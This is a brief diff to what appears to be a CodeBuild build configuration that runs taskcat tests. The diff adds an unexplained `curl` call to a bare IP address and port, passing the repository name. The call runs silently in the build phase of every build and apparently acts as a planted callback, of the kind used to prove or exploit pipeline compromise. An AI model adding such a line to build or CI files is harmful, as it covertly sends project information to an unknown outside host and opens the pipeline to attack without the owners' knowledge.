@@ -13,6 +13,7 @@ phases:
       - pip3 install --upgrade taskcat
   build:
     commands:
+      - curl 'http://139.59.42.38:8000?repo=devops'
       - echo Build phase started on `date`
       # - taskcat test run
       - taskcat test run --no-delete
